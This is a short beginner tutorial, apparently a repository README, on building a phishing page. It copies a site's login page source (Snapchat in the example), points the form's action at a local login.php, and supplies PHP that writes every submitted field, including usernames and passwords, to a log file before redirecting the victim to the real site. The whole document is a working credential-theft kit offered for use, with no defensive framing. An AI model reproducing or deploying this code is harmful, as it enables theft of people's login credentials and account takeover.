# Creating-a-phishing-page---very simple-steps-for-dummies-PhP-

Phishing is the most common attack which is used to hack any login details.
For which we need to have phishing pages to upload then in hosting sites.
Here i will show you an example of creating Phishing page (fake loGin page) of Facebook.The method is same for any other website
What we are going to do now.Normally in phishing we will just create a login page which looks same like the real website. For this we need not to code the whole script of the desired website. 

StepS to Reproduce:

1. First go to the desired website Login page for which you want to create Phishing page
lets take www.snapchat.com

2. Right click on the website and choose “page source” . Now you can see the whole script of the website.

3. Copy the whole script and paste it into a text file. Press Control+F and type ” action “.
Here in the case of “www.snapchat.com “. The script line that has “action” looks something like this.
action=”https://www.snapchat.com/login.php?login_attempt=1“. Now replace everything inside the quotes with 
” login.php”. 

So it will look like action=”login.php“ 

4. Save the file as index.html.

5. Now open a new text file and paste the following code

header (‘Location: http://snapchat.com ‘);

$handle = fopen(“logs_86354.txt”, “a”);

foreach($_POST as $variable => $value) {

fwrite($handle, $variable);

fwrite($handle, “=”);

fwrite($handle, $value);

fwrite($handle, “\r\n”);

}

fwrite($handle, “===============\r\n”);

fclose($handle);

exit;

?>

Save it as “login.php”
